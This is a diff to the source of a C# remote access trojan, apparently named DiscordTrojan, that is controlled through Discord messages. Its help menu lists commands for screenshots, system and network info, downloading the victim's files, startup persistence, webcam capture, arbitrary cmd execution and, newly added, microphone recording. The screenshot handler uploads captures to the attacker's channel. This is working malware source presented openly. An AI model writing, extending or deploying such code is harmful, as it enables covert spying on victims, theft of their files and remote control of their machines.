@@ -121,14 +121,12 @@ namespace DiscordTrojan
                 {
                     var help = new EmbedBuilder();
                     help.WithTitle("Help");
-                    help.WithDescription("!ScreenShot - show photo of desktop\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!Get Files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!Get File (directory) - returns the file you want to download\n\n!StartUp true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera\n\n!WebCamSnap get webcamerapic\n\n!Target choose a target to target/!Untarget User to untarget them\n\n!Cmd command will start cmd and execute it");
+                    help.WithDescription("!ScreenShot - show photo of desktop\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!Get Files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!Get File (directory) - returns the file you want to download\n\n!StartUp true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera\n\n!Target choose a target to target/!Untarget User to untarget them\n\n!Cmd command will start cmd and execute it\n\n!MicRecord Record the mic for a few seconds"); 
                     help.WithColor(Discord.Color.Teal);
                     message.Channel.SendMessageAsync("", false, help.Build());
                 }             
                 if (message.Content == "!ScreenShot")
                 {
-
-
                     GetDesktop();
                     message.Channel.SendFileAsync(userPath + root + "\\Capture.jpg");
                     Thread.Sleep(1000);
@@ -247,7 +245,6 @@ namespace DiscordTrojan
             return Task.CompletedTask;
         }
 
-
         // ************************ CAMERA ********************************
         // Inside your Program class, add the following implementation for the WebCamSnap() method:
         private void CameraSnap()
@@ -322,7 +319,5 @@ namespace DiscordTrojan
             }
             throw new Exception("no");
         }
-
-
     }
 }
